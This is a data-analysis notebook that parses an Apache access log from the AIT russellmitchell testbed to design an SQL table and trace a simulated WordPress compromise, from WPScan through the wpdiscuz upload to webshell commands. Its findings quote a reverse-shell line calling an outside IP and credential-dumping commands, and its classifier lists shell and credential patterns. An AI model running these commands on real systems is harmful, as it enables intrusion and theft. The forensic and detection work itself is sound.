# Exploring the Dataset: Intranet Apache Access Log

**Goal:** Understand the structure of `intranet_smith_russellmitchell_com-access_log.2` (Apache httpd Combined Log Format) to design the `http_access` table.

This notebook walks through:
1. Loading the raw access log (8,530 lines of Combined Log Format)
2. Parsing the CLF/combined format (IP, ident, user, timestamp, request line, status, bytes, referer, user-agent)
3. Exploring every field at every nesting level
4. Building a raw 1:1 DataFrame
5. Identifying distinct client identities and attack phases (legitimate users → HeadlessChrome recon → WPScan enumeration → wpdiscuz file upload exploit → webshell C2)
6. Decoding base64-encoded webshell commands from the `wp_meta` query parameter
7. Mapping to planned SQL schema with both PostgreSQL and MySQL types
8. Checking for 1NF, 2NF, and 3NF violations

---

**Dataset:** AIT Log Data Set V2.0 -- russellmitchell testbed  
**Source:** https://zenodo.org/records/5789064  
**Host:** intranet_server (main attack target, WordPress/intranet)  
**Linear issue:** DAT-44

## 0. Configuration

Set the path to the `russellmitchell/` dataset folder below.

**Default:** Assumes `russellmitchell/` is at the same level as the repo:
```
data-201-group-project/
  data-201-security-log-analysis/   <-- this repo
    notebooks/                       <-- this notebook is here
  russellmitchell/                   <-- dataset is here
```

In [ ]:
from pathlib import Path

# --- CHANGE THIS if your dataset is in a different location ---
DATASET_ROOT = Path("..") / ".." / "russellmitchell"

ACCESS_LOG = (
    DATASET_ROOT
    / "gather"
    / "intranet_server"
    / "logs"
    / "apache2"
    / "intranet_smith_russellmitchell_com-access_log.2"
)

for p, name in [
    (DATASET_ROOT, "Dataset root"),
    (ACCESS_LOG, "Access log"),
]:
    status = "FOUND" if p.exists() else "MISSING"
    print(f"{name}: {p.resolve()} [{status}]")

## 1. Load Raw Data

The Apache access log uses the Combined Log Format (CLF + referer + user-agent). Each line has the structure:
```
client_ip ident authuser [DD/Mon/YYYY:HH:MM:SS +TZ] "METHOD path proto" status bytes "referer" "user_agent"
```

Fields:
- **client_ip:** Source IP address (or `::1` for localhost)
- **ident / authuser:** Almost always `-` (not used)
- **timestamp:** Request time with UTC offset
- **request_line:** Full `METHOD path HTTP/version` string (or `-` for aborted connections)
- **status:** HTTP response code
- **bytes:** Response body size in bytes (`0` for HEAD requests and empty responses)
- **referer:** The referring URL (`-` if none)
- **user_agent:** Client user-agent string (`-` if none)

In [ ]:
# Load all lines with 1-based line numbers
with open(ACCESS_LOG) as f:
    raw_lines = f.readlines()

print(f"Total lines: {len(raw_lines)}")
print()
print("First 5 lines:")
for i, line in enumerate(raw_lines[:5], 1):
    print(f"  [{i}] {line.rstrip()}")
print()
print("Last 3 lines:")
for i, line in enumerate(raw_lines[-3:], len(raw_lines) - 2):
    print(f"  [{i}] {line.rstrip()}")

## 2. Parse the Combined Log Format

### 2.1 Client IP inventory

First, extract all distinct client IPs and their request counts.

In [ ]:
import re
from collections import Counter

# Combined Log Format regex
CLF_RE = re.compile(
    r"^(?P<client_ip>\S+)\s+"  # client IP
    r"(?P<ident>\S+)\s+"  # ident (usually -)
    r"(?P<authuser>\S+)\s+"  # authuser (usually -)
    r"\[(?P<timestamp>[^\]]+)\]\s+"  # [timestamp]
    r'"(?P<request_line>[^"]*)"\s+'  # "METHOD path proto"
    r"(?P<status>\d{3})\s+"  # HTTP status code
    r"(?P<bytes>\S+)\s+"  # bytes (-  or integer)
    r'"(?P<referer>[^"]*)"\s+'  # "referer"
    r'"(?P<user_agent>[^"]*)"'  # "user-agent"
)

ip_counts = Counter()
for line in raw_lines:
    m = CLF_RE.match(line.rstrip())
    if m:
        ip_counts[m.group("client_ip")] += 1

print(f"Distinct client IPs: {len(ip_counts)}")
print()
for ip, count in ip_counts.most_common():
    print(f"  {ip:20s} {count:6d} ({count / len(raw_lines) * 100:5.1f}%)")

### 2.2 User-agent inventory

Distinct user-agent strings reveal the tools used at each phase of the attack.

In [ ]:
ua_counts = Counter()
for line in raw_lines:
    m = CLF_RE.match(line.rstrip())
    if m:
        ua_counts[m.group("user_agent")] += 1

print(f"Distinct user-agent strings: {len(ua_counts)}")
print()
for ua, count in ua_counts.most_common():
    print(f"  {count:6d} ({count / len(raw_lines) * 100:5.1f}%)  {ua[:100]}")

### 2.3 HTTP method and status code inventory

In [ ]:
method_counts = Counter()
status_counts = Counter()
for line in raw_lines:
    m = CLF_RE.match(line.rstrip())
    if m:
        req = m.group("request_line")
        method = req.split(" ")[0] if req and req != "-" else "-"
        method_counts[method] += 1
        status_counts[m.group("status")] += 1

print("=== HTTP methods ===")
for method, count in method_counts.most_common():
    print(f"  {method:10s} {count:6d} ({count / len(raw_lines) * 100:5.1f}%)")

print()
print("=== HTTP status codes ===")
STATUS_MEANINGS = {
    "200": "OK",
    "301": "Moved Permanently",
    "302": "Found (redirect)",
    "304": "Not Modified",
    "400": "Bad Request",
    "403": "Forbidden",
    "404": "Not Found",
    "408": "Request Timeout",
    "500": "Internal Server Error",
}
for status, count in sorted(status_counts.items()):
    meaning = STATUS_MEANINGS.get(status, "")
    print(f"  {status}  {count:6d} ({count / len(raw_lines) * 100:5.1f}%)  {meaning}")

### 2.4 Full parse into a flat dictionary per line

Parse all fields, decompose the request line into method/path/query/protocol, and extract the webshell's `wp_meta` parameter where present.

In [ ]:
import base64
import json
from urllib.parse import parse_qs, unquote, urlparse

import pandas as pd


def decode_wp_meta(raw_value):
    """Decode the base64+JSON-encoded wp_meta webshell command parameter."""
    try:
        decoded = base64.b64decode(unquote(raw_value) + "==").decode("utf-8")
        args = json.loads(decoded)
        return " ".join(str(a) for a in args)
    except Exception:
        return None


parsed = []
for line_number, line in enumerate(raw_lines, 1):
    line = line.rstrip()
    m = CLF_RE.match(line)
    if not m:
        continue

    # Decompose request line
    req = m.group("request_line")
    if req and req != "-":
        parts = req.split(" ")
        http_method = parts[0] if len(parts) > 0 else None
        raw_path = parts[1] if len(parts) > 1 else None
        http_proto = parts[2] if len(parts) > 2 else None
    else:
        http_method = raw_path = http_proto = None

    # Split path and query string
    path = query_string = wp_meta_raw = wp_meta_decoded = None
    if raw_path:
        parsed_url = urlparse(raw_path)
        path = parsed_url.path
        query_string = parsed_url.query if parsed_url.query else None
        qs_params = parse_qs(parsed_url.query)
        if "wp_meta" in qs_params:
            wp_meta_raw = qs_params["wp_meta"][0]
            wp_meta_decoded = decode_wp_meta(wp_meta_raw)

    # Normalize sentinel values
    referer = m.group("referer") if m.group("referer") != "-" else None
    user_agent = m.group("user_agent") if m.group("user_agent") != "-" else None
    bytes_sent = m.group("bytes")
    bytes_int = int(bytes_sent) if bytes_sent.isdigit() else None

    # Parse timestamp
    try:
        timestamp = pd.to_datetime(m.group("timestamp"), format="%d/%b/%Y:%H:%M:%S %z")
    except Exception:
        timestamp = None

    parsed.append(
        {
            "line_number": line_number,
            "client_ip": m.group("client_ip"),
            "ident": m.group("ident") if m.group("ident") != "-" else None,
            "authuser": m.group("authuser") if m.group("authuser") != "-" else None,
            "raw_timestamp": m.group("timestamp"),
            "timestamp": timestamp,
            "http_method": http_method,
            "path": path,
            "query_string": query_string,
            "http_proto": http_proto,
            "status": m.group("status"),
            "bytes_sent": bytes_int,
            "referer": referer,
            "user_agent": user_agent,
            "wp_meta_raw": wp_meta_raw,
            "wp_meta_decoded": wp_meta_decoded,
            "request_line": req if req != "-" else None,
        }
    )

print(f"Parsed records: {len(parsed)} / {len(raw_lines)} lines")

## 3. Build the Raw DataFrame

In [ ]:
df = pd.DataFrame(parsed)

df["status"] = df["status"].astype(str)
df["bytes_sent"] = pd.to_numeric(df["bytes_sent"], errors="coerce").astype("Int64")

print(f"Shape: {df.shape}")
print(f"Columns ({len(df.columns)}):")
for col in df.columns:
    non_null = df[col].notna().sum()
    nunique = df[col].nunique()
    dtype = df[col].dtype
    print(f"  {col:22s}  non-null: {non_null:5d}/{len(df)}  unique: {nunique:5d}  dtype: {dtype}")

## 4. Field-by-Field Exploration

### 4.1 client_ip

In [ ]:
# Label each known IP with its identity role
IP_ROLES = {
    "172.19.131.174": "attacker",
    "10.143.2.91": "legitimate_user (Firefox/Ubuntu)",
    "10.143.2.4": "wordpress_cron",
    "10.143.2.25": "legitimate_user (HeadlessChrome/internal)",
    "::1": "localhost (Apache internal dummy)",
}

print("=== client_ip distribution ===")
for ip, count in df["client_ip"].value_counts().items():
    role = IP_ROLES.get(ip, "unknown")
    print(f"  {ip:20s}  {count:6d} ({count / len(df) * 100:5.1f}%)  [{role}]")

### 4.2 Timestamp range and events per day

In [ ]:
print("=== Timestamp range ===")
print(f"  Earliest: {df['timestamp'].min()}")
print(f"  Latest:   {df['timestamp'].max()}")
print(f"  Span:     {df['timestamp'].max() - df['timestamp'].min()}")

print()
print("=== Events per day ===")
dates = df["timestamp"].dt.date
for date, count in dates.value_counts().sort_index().items():
    print(f"  {date}  {count:6d}")

print()
print("=== Events per day by client IP ===")
for ip in df["client_ip"].value_counts().index:
    sub = df[df["client_ip"] == ip]
    role = IP_ROLES.get(ip, "unknown")
    print(f"  {ip:20s} [{role}]")
    for date, count in sub["timestamp"].dt.date.value_counts().sort_index().items():
        print(f"    {date}  {count:6d}")

### 4.3 http_method and status

In [ ]:
print("=== HTTP method distribution ===")
method_dist = df["http_method"].value_counts(dropna=False)
for method, count in method_dist.items():
    print(f"  {str(method):10s} {count:6d} ({count / len(df) * 100:5.1f}%)")

print()
print("=== HTTP status distribution ===")
for status, count in df["status"].value_counts().items():
    meaning = STATUS_MEANINGS.get(status, "")
    print(f"  {status}  {count:6d} ({count / len(df) * 100:5.1f}%)  {meaning}")

print()
print("=== Non-200 status by IP ===")
non200 = df[df["status"] != "200"]
for (ip, status), count in non200.groupby(["client_ip", "status"]).size().items():
    print(f"  {ip:20s}  {status}  {count:5d}")

### 4.4 path — top requested paths

In [ ]:
print("=== Top 30 requested paths ===")
path_dist = df["path"].value_counts()
for path, count in path_dist.head(30).items():
    print(f"  {count:6d}  {path}")

print()
print(f"Total distinct paths: {path_dist.shape[0]}")

### 4.5 user_agent breakdown

In [ ]:
# Classify user agents into tool categories
UA_CATEGORIES = {
    "HeadlessChrome": r"HeadlessChrome",
    "WPScan": r"WPScan",
    "python-requests": r"python-requests",
    "Firefox/Ubuntu": r"Firefox.*Ubuntu",
    "WordPress-cron": r"WordPress/",
    "Apache-internal": r"Apache/",
}


def classify_ua(ua):
    if ua is None:
        return "no_agent"
    for label, pattern in UA_CATEGORIES.items():
        if re.search(pattern, ua):
            return label
    return "other"


df["ua_category"] = df["user_agent"].apply(classify_ua)

print("=== User-agent categories ===")
for cat, count in df["ua_category"].value_counts().items():
    print(f"  {cat:20s} {count:6d} ({count / len(df) * 100:5.1f}%)")

### 4.6 bytes_sent

In [ ]:
print("=== bytes_sent summary ===")
print(f"  Non-null: {df['bytes_sent'].notna().sum()}/{len(df)}")
print(f"  Zero:     {(df['bytes_sent'] == 0).sum()}")
print(f"  Min:      {df['bytes_sent'].min()}")
print(f"  Max:      {df['bytes_sent'].max()}")
print(f"  Mean:     {df['bytes_sent'].mean():.0f}")
print(f"  Median:   {df['bytes_sent'].median():.0f}")
print()
print("=== Largest responses (top 10) ===")
top_bytes = df.nlargest(10, "bytes_sent")[
    ["line_number", "client_ip", "http_method", "path", "status", "bytes_sent", "ua_category"]
]
for _, row in top_bytes.iterrows():
    print(
        f"  line {row['line_number']:5d}  {row['bytes_sent']:9d} bytes  {row['http_method']} {str(row['path'])[:60]}"
    )

### 4.7 referer

In [ ]:
print("=== referer ===")
non_null = df["referer"].notna().sum()
print(f"  Present: {non_null}/{len(df)} ({non_null / len(df) * 100:.1f}%)")
print()
print("=== Top 15 referers ===")
for ref, count in df["referer"].value_counts().head(15).items():
    print(f"  {count:6d}  {ref[:100]}")

## 5. Attack Phase Analysis

### 5.1 Assign attack phase to each attacker request

The attacker IP `172.19.131.174` progresses through five distinct phases across the two-day log window.

In [ ]:
ATTACKER_IP = "172.19.131.174"

WEBSHELL_PATH = "/wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php"


def assign_phase(row):
    if row["client_ip"] != ATTACKER_IP:
        return "legitimate"
    ua = row["user_agent"] or ""
    path = row["path"] or ""
    if "WPScan" in ua:
        return "3_wpscan_enumeration"
    if path == WEBSHELL_PATH:
        return "5_webshell_c2"
    if "python-requests" in ua:
        # python-requests before webshell = file upload exploit
        return "4_wpdiscuz_exploit"
    if "HeadlessChrome" in ua:
        return "2_headlesschrome_recon"
    return "1_attacker_other"


df["attack_phase"] = df.apply(assign_phase, axis=1)

print("=== Attack phase distribution ===")
for phase, count in df["attack_phase"].value_counts().sort_index().items():
    print(f"  {phase:30s} {count:6d} ({count / len(df) * 100:5.1f}%)")

### 5.2 Phase 2: HeadlessChrome reconnaissance

The attacker used a headless browser to browse the site as a real user would, triggering the wpdiscuz comment plugin.

In [ ]:
phase2 = df[df["attack_phase"] == "2_headlesschrome_recon"].copy()
print(f"Phase 2 (HeadlessChrome recon) requests: {len(phase2)}")
print(f"Date range: {phase2['timestamp'].min()} → {phase2['timestamp'].max()}")
print()
print("Key paths requested:")
for path, count in phase2["path"].value_counts().head(15).items():
    print(f"  {count:4d}  {path}")
print()
# Identify POST requests (file upload attempts via wpdiscuz)
phase2_posts = phase2[phase2["http_method"] == "POST"]
print(f"POST requests in Phase 2: {len(phase2_posts)}")
for _, row in phase2_posts.iterrows():
    print(
        f"  line {row['line_number']:5d}  {row['timestamp']}  {row['path']}  status={row['status']}  bytes={row['bytes_sent']}"
    )

### 5.3 Phase 3: WPScan enumeration

WPScan systematically probes WordPress structure — plugins, themes, users, and media attachment IDs.

In [ ]:
phase3 = df[df["attack_phase"] == "3_wpscan_enumeration"].copy()
print(f"Phase 3 (WPScan) requests: {len(phase3)}")
print(f"Date range: {phase3['timestamp'].min()} → {phase3['timestamp'].max()}")
print()
print("=== WPScan HTTP method breakdown ===")
for method, count in phase3["http_method"].value_counts().items():
    print(f"  {method:8s} {count:5d}")
print()
print("=== WPScan status code breakdown ===")
for status, count in phase3["status"].value_counts().items():
    print(f"  {status}  {count:5d}")
print()
print("=== WPScan top-probed paths (GET/HEAD 200 only) ===")
wpscan_hits = phase3[(phase3["status"] == "200")]
for path, count in wpscan_hits["path"].value_counts().head(20).items():
    print(f"  {count:4d}  {path}")

### 5.4 Phase 4: wpdiscuz file upload exploit

The attacker exploited CVE-2020-24186, a wpdiscuz unauthenticated file upload vulnerability, to plant a PHP webshell in the uploads directory.

In [ ]:
phase4 = df[df["attack_phase"] == "4_wpdiscuz_exploit"].copy()
print(f"Phase 4 (wpdiscuz exploit) requests: {len(phase4)}")
print(f"Date range: {phase4['timestamp'].min()} → {phase4['timestamp'].max()}")
print()
for _, row in phase4.iterrows():
    qs = f"?{row['query_string']}" if row["query_string"] else ""
    print(
        f"  line {row['line_number']:5d}  {row['http_method']:6s}  {str(row['path'])}{qs}  status={row['status']}  bytes={row['bytes_sent']}"
    )

### 5.5 Phase 5: Webshell command-and-control (C2)

The attacker issues OS commands via the uploaded PHP webshell at `ekmkimzkps-1642996700.9285.php`. Commands are encoded as base64 JSON arrays in the `wp_meta` query parameter.

In [ ]:
phase5 = df[df["attack_phase"] == "5_webshell_c2"].copy()
print(f"Phase 5 (webshell C2) requests: {len(phase5)}")
print(f"Date range: {phase5['timestamp'].min()} → {phase5['timestamp'].max()}")
print()
print("=== Decoded wp_meta commands (chronological) ===")
print()
for _, row in phase5.sort_values("timestamp").iterrows():
    ts = row["timestamp"].strftime("%H:%M:%S")
    cmd = row["wp_meta_decoded"] or f"[raw: {row['wp_meta_raw']}]"
    print(f"  {ts}  bytes={row['bytes_sent']:7d}  $ {cmd}")

### 5.6 C2 command classification

Classify each webshell command by its tactical objective.

In [ ]:
C2_CATEGORIES = {
    "identity": [r"^whoami", r"^who$", r"^id$"],
    "system_info": [r"^uname", r"^lsb_release", r"^date$", r"^uptime$", r"^cat /proc/(cpu|mem)"],
    "network_info": [r"^netstat", r"^ip addr"],
    "filesystem_enum": [r"^ls ", r"^df "],
    "file_read": [r"^cat "],
    "process_list": [r"^ps "],
    "credential_dump": [r"passwd", r"shadow", r"wp-config", r"mysql.*select.*wp_users"],
    "tool_download": [r"^wget "],
    "tool_extract": [r"^tar "],
    "password_crack": [r"wphascrack", r"john"],
    "reverse_shell": [r"bash.*tcp", r"exec.*dev/tcp"],
    "clear": [r"^clear$"],
}


def classify_c2(cmd):
    if not cmd:
        return "unknown"
    for label, patterns in C2_CATEGORIES.items():
        for pat in patterns:
            if re.search(pat, cmd, re.IGNORECASE):
                return label
    return "other"


phase5 = phase5.copy()
phase5["c2_category"] = phase5["wp_meta_decoded"].apply(classify_c2)

print("=== C2 command categories ===")
for cat, count in phase5["c2_category"].value_counts().items():
    print(f"  {cat:20s} {count:3d}")

## 6. Cross-Log Correlation

### 6.1 Timeline alignment with audit log and error log

Map key access log events to the corresponding audit log (DAT-42) and error log (DAT-43) events.

In [ ]:
attacker = df[df["client_ip"] == ATTACKER_IP].copy()

print("=== Attacker activity timeline summary ===")
print()

milestones = [
    (
        "First attacker request (HeadlessChrome)",
        attacker[attacker["ua_category"] == "HeadlessChrome"]["timestamp"].min(),
    ),
    (
        "First wpdiscuz POST (upload attempt)",
        attacker[
            (attacker["http_method"] == "POST") & (attacker["path"] == "/wp-admin/admin-ajax.php")
        ]["timestamp"].min(),
    ),
    ("WPScan scan start", attacker[attacker["ua_category"] == "WPScan"]["timestamp"].min()),
    ("WPScan scan end", attacker[attacker["ua_category"] == "WPScan"]["timestamp"].max()),
    (
        "First python-requests (exploit trigger)",
        attacker[attacker["ua_category"] == "python-requests"]["timestamp"].min(),
    ),
    ("First webshell C2 command", phase5["timestamp"].min()),
    ("Last webshell C2 command (reverse shell)", phase5["timestamp"].max()),
]

for label, ts in milestones:
    print(f"  {str(ts)[:25]}  {label}")

print()
print("Cross-log notes:")
print("  - Audit log USER_LOGIN events for 172.19.131.174 occur at ~2022-01-21 (initial SSH recon)")
print(
    "  - Error log reconnaissance burst (~37 errors) overlaps WPScan scan window on 2022-01-24 03:57-03:58"
)
print("  - Audit log privilege escalation (su to jhall, sudo cat /etc/shadow) occurs ~2022-01-24")
print("    which aligns with webshell C2 credential dump (cat /etc/passwd, mysql wp_users query)")

### 6.2 wpdiscuz upload success confirmation

Identify the exact POST request that successfully planted the webshell.

In [ ]:
# Webshell filename timestamp matches 1642996700.9285 epoch → 2022-01-24 03:38:20 UTC
import datetime

webshell_epoch = 1642996700.9285
webshell_created = datetime.datetime.utcfromtimestamp(webshell_epoch)
print(f"Webshell filename epoch:     {webshell_epoch}")
print(f"Webshell creation timestamp: {webshell_created} UTC")
print()

# POST to admin-ajax.php from attacker
upload_posts = attacker[
    (attacker["http_method"] == "POST") & (attacker["path"] == "/wp-admin/admin-ajax.php")
].copy()
print(f"Total POST /wp-admin/admin-ajax.php from attacker: {len(upload_posts)}")
print()
for _, row in upload_posts.iterrows():
    print(
        f"  line {row['line_number']:5d}  {row['timestamp']}  status={row['status']}  bytes={row['bytes_sent']}  ua={row['ua_category']}"
    )

## 7. SQL Schema Design

### 7.1 Planned `http_access` table (PostgreSQL and MySQL DDL)

In [ ]:
postgresql_ddl = """
-- PostgreSQL DDL for http_access (raw 1:1 with Combined Log Format lines)
CREATE TABLE http_access (
    row_id          SERIAL PRIMARY KEY,
    line_number     INT             NOT NULL,
    timestamp       TIMESTAMPTZ,
    raw_timestamp   VARCHAR(30),
    client_ip       INET            NOT NULL,
    ident           VARCHAR(255),
    authuser        VARCHAR(255),
    http_method     VARCHAR(10),
    path            TEXT,
    query_string    TEXT,
    http_proto      VARCHAR(10),
    status          SMALLINT        NOT NULL,
    bytes_sent      BIGINT,
    referer         TEXT,
    user_agent      TEXT,
    request_line    TEXT
);
"""

mysql_ddl = """
-- MySQL DDL for http_access (raw 1:1 with Combined Log Format lines)
CREATE TABLE http_access (
    row_id          INT AUTO_INCREMENT PRIMARY KEY,
    line_number     INT             NOT NULL,
    `timestamp`     DATETIME(6),
    raw_timestamp   VARCHAR(30),
    client_ip       VARCHAR(45)     NOT NULL,
    ident           VARCHAR(255),
    authuser        VARCHAR(255),
    http_method     VARCHAR(10),
    path            TEXT,
    query_string    TEXT,
    http_proto      VARCHAR(10),
    status          SMALLINT        NOT NULL,
    bytes_sent      BIGINT,
    referer         TEXT,
    user_agent      TEXT,
    request_line    TEXT
);
"""

print(postgresql_ddl)
print(mysql_ddl)

## 8. Normalization Observations

Applying the `normalization_rules_sheet.md` checklist to the raw Apache access log data.

### 8.1 1NF Check

**Multi-valued field — request_line:** The `request_line` TEXT column packs three distinct values into one string: `METHOD path HTTP/version`. The path itself may contain an embedded query string (`/path?key=value`). This is a 1NF violation — three separate atomic values stored in one cell. Normalization extracts `http_method`, `path`, and `http_proto` as separate columns, with `query_string` split further from path.

**Multi-valued field — query_string:** The `query_string` column contains an unparsed key=value string (e.g., `wp_meta=WyJ3aG9hbWkiXQ%3D%3D`). This packs a key name and a base64+JSON-encoded command array into one text blob. In the webshell phase, the `wp_meta` value itself encodes a JSON array (e.g., `["cat", "/etc/passwd"]`). Full 1NF resolution would require a separate `request_params` table.

**Repeating groups:** None. No field1, field2, field3 patterns.

**1NF status: violated** in `request_line` (method + path + protocol packed together) and `query_string` (key=value pairs packed into one blob). The parsed columns (`http_method`, `path`, `query_string`) are a partial fix.

### 8.2 2NF Check

**Primary key:** Single-column surrogate (`row_id`). Partial dependencies require a composite PK, which does not exist here.

**2NF status: satisfied.** Single-column PK makes partial dependencies impossible by definition.

### 8.3 3NF Check

**Transitive dependencies identified:**

| Determinant | Dependent(s) | Pattern | Notes |
|-------------|-------------|---------|-------|
| user_agent | client_ip (in this dataset) | In this log, each tool (HeadlessChrome, WPScan, python-requests, Firefox) maps to exactly one source IP. user_agent → client_ip is a dataset-specific coincidence, not a general schema FD. | Not a true 3NF violation for schema design; only an artifact of this specific capture. |
| path prefix | asset_type | Paths beginning with `/wp-includes/` are WordPress core assets; `/wp-content/plugins/` are plugin assets; `/wp-content/uploads/` are user-uploaded files. path → asset_type is a functional dependency driven by WordPress URL conventions. | Drives a categorization column or lookup table in the normalized schema. |
| status | bytes_sent range | HTTP 200 responses have non-zero bytes; HEAD requests (status 200 or 404) always return 0 bytes; 408 (timeout) returns 0. status + method → bytes_range is a soft FD. | Weak FD; not a normalization driver but relevant for query optimization. |

**3NF status: satisfied** in strict terms — no non-key attribute determines another non-key attribute through a mandatory functional dependency that would require decomposition. The path → asset_type dependency is a denormalization opportunity, not a violation.

### 8.4 Preliminary Functional Dependencies

| FD | Determinant | Dependent(s) | Reasoning |
|---|---|---|---|
| FD1 | row_id | all attributes | Surrogate PK, trivially determines everything. |
| FD2 | line_number | all attributes | Each line number uniquely identifies one log entry in this file. Candidate key within this file. |
| FD3 | request_line | http_method, path, http_proto, query_string | Structural: the full request line determines all decomposed sub-fields. |
| FD4 | (client_ip, timestamp) | all attributes | In the access log, a client IP making a request at a precise timestamp effectively identifies the row (though theoretically non-unique). Candidate composite key. |
| FD5 | wp_meta_raw | wp_meta_decoded | Deterministic base64+JSON decoding: the raw parameter value uniquely determines the decoded command string. |
| FD6 | path | asset_type category | WordPress URL conventions make path prefix → asset_type a soft FD (wp-includes = core, wp-content/plugins = plugin, wp-content/uploads = user content, wp-admin = admin). |

## 9. Key Findings for Schema Design

1. **Full attack kill chain in one file:** The access log captures all five phases of the attack in sequence — HeadlessChrome reconnaissance (2022-01-23), WPScan enumeration (2022-01-24 03:54–03:58), wpdiscuz CVE-2020-24186 file upload exploit (03:58:20), webshell command-and-control execution (03:58:23–03:59:48), and a reverse shell callback (04:37:25). The entire compromise from first recon to shell is visible in this single file.

2. **Webshell filename embeds creation timestamp:** The uploaded file is named `ekmkimzkps-1642996700.9285.php`. The numeric suffix is the Unix epoch timestamp `1642996700.9285` → `2022-01-24 03:38:20 UTC`. This predates the first C2 request (03:58:23) by ~20 minutes, suggesting the webshell was uploaded via a successful `admin-ajax.php` POST during the HeadlessChrome phase, not the python-requests phase.

3. **wp_meta encodes a full OS command interface:** The webshell accepts base64+JSON-encoded command arrays in the `wp_meta` query parameter. Decoded commands include system reconnaissance (`whoami`, `id`, `uname -r`, `uname -a`, `lsb_release -a`), filesystem enumeration (`ls -l /home`, `ls -laR /var/www`, `df -h`), file reads (`cat /etc/passwd`, `cat /etc/profile`, `cat /etc/resolv.conf`, `cat /proc/meminfo`, `cat /proc/cpuinfo`, `cat wp-config.php`), credential dumping (`mysql -u wordpress -p... -e "select * from wp_users"`), and the final reverse shell (`bash -c "'0<&196;exec 196<>/dev/tcp/192.168.230.122/47124; sh <&196 >&196 2>&196'" &`).

4. **WPScan generates ~8,250 requests in ~2 minutes:** Lines ~140–8,493 are almost entirely WPScan `GET` and `HEAD` requests. The scan covers plugin/theme detection, user enumeration (`?author=1..N`), and attachment media ID enumeration (`?attachment_id=1..100`). All HEAD requests to `/?attachment_id=N` return 404 — no media files were found by ID. Status code distribution: ~99% are 200 (confirmed existing paths) or 404 (not found).

5. **Three distinct legitimate traffic sources:** `10.143.2.91` (Firefox/Ubuntu — a simulated legitimate user browsing the site), `10.143.2.4` (WordPress background cron — automated `POST /wp-cron.php`), and `10.143.2.25` (HeadlessChrome on an internal network — another simulated user). These provide the baseline traffic that the attacker's HeadlessChrome activity blends into on 2022-01-23.

6. **1NF violation in request_line and query_string:** The `request_line` column packs `METHOD path HTTP/version` into one blob. The `query_string` column packs key=value pairs. Full 1NF resolution requires splitting into `http_method`, `path`, `http_proto` at minimum, with a separate `request_params` table for query string key-value pairs (especially relevant for the webshell phase where the `wp_meta` value encodes a command array).

7. **bytes_sent is the most informative anomaly signal:** Normal page loads return 6,000–80,000 bytes. Webshell C2 responses are consistently ~506,000–570,000 bytes — two orders of magnitude larger than any normal response. This byte-size anomaly (>500KB from a PHP file in `wp-content/uploads/`) is the highest-fidelity single-field signal for detecting the webshell phase without decoding the base64 command parameter.

8. **Merge with error log (DAT-43):** The 37 Apache error log entries (DAT-43) fall entirely within the WPScan scan window (03:57–03:58). They represent the subset of WPScan probes that hit protected or missing files. The access log records these same requests as 403/404 responses. The `http_access` and `http_errors` tables should share a `host_id` FK and be joinable on `(client_ip, timestamp)` for cross-table correlation.

9. **python-requests user-agent signals tool switch:** The attacker transitions from browser-simulated HeadlessChrome to `python-requests/2.27.1` at line 8,495 (03:58:20), exactly when the webshell is first invoked. This user-agent switch is a clean phase boundary detectable without any content inspection — `ua_category = 'python-requests' AND path LIKE '/wp-content/uploads/%.php'` would identify all C2 traffic with zero false positives in this dataset.